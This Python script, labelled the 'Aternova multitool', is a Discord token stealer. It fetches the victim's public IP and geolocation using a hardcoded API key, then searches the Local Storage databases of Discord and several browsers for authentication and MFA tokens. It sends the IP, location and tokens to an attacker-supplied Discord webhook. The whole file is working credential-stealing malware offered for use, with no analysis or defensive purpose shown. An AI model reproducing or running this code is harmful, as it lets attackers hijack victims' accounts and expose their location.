import os
import requests
import json
import re
from dhooks import Webhook, Embed
from datetime import datetime

#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!

# WEBHOOK
hook = Webhook("YOUR WEBHOOK HERE")

ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'https://geo.ipify.org/api/v2/country?apiKey=at_R8PCEHjzhgL8DHOnRamh4mJsjq5aj&ipAddress={ip}')
geo = r.json()
embed = Embed()

# INVISIBLE IP
embed.add_field(name='IP (Click to reveal)', value='||' + geo['ip'] + '||', inline=True)

# IPS LOCS
fields = [
    {'name': 'Country', 'value': geo['location']['country']},
    {'name': 'Region', 'value': geo['location'].get('region')},
    {'name': 'Timezone', 'value': geo['location'].get('timezone')},
    {'name': 'Route',   'value': geo['as'].get('route')},
    {'name': 'Domain Name',   'value': geo['as'].get('name')},
    {'name': 'Domain Details',   'value': geo['as'].get('domain')},
    {'name': 'ASN',   'value': geo['as'].get('asn')}
]

# FIND TOKEN
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

# RUN MAIN
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                fields.append({'name': 'Token', 'value': token})
        else:
            fields.append({'name': 'Token', 'value': 'No tokens found.'})

    for field in fields:
        value = field.get('value')
        if value is not None:
            embed.add_field(name=field['name'], value=value, inline=True)

    message = hook.send(embed=embed)
main()
